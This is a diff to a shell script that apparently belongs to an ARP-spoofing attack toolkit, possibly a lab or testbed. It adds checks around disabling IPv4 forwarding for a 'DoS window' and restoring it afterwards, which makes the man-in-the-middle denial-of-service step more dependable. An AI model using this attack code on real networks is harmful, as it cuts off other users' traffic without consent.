@@ -27,8 +27,16 @@ require_tools sysctl
 
 echo "DOS enabled for $TIME_DOS seconds"
 sysctl -w net.ipv4.ip_forward=0 >/dev/null
+if [ "$(sysctl -n net.ipv4.ip_forward)" != "0" ]; then
+  echo "Failed to disable IPv4 forwarding for DoS window." >&2
+  exit 1
+fi
 sleep $TIME_DOS
 
 echo "Removing arp spoofing..."
 ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
 sysctl -w net.ipv4.ip_forward=1 >/dev/null
+if [ "$(sysctl -n net.ipv4.ip_forward)" != "1" ]; then
+  echo "Failed to restore IPv4 forwarding after DoS window." >&2
+  exit 1
+fi
